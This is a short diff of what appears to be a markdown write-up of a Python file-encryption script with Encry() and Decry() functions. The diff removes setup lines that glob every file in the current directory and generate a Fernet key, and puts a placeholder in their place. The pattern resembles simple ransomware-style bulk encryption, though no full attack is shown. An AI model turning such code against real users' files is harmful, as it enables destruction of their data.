@@ -32,13 +32,7 @@ def Encry():
 ##### Decrypt Source Code
 
 ```
-from cryptography.fernet import Fernet
-
-Encrypt = {}
-Files = glob.glob("*.*")
-
-Key = Fernet.generate_key()
-F = Fernet(Key)
+( Encrypt Source Code )
 
 def Decry():
   try:
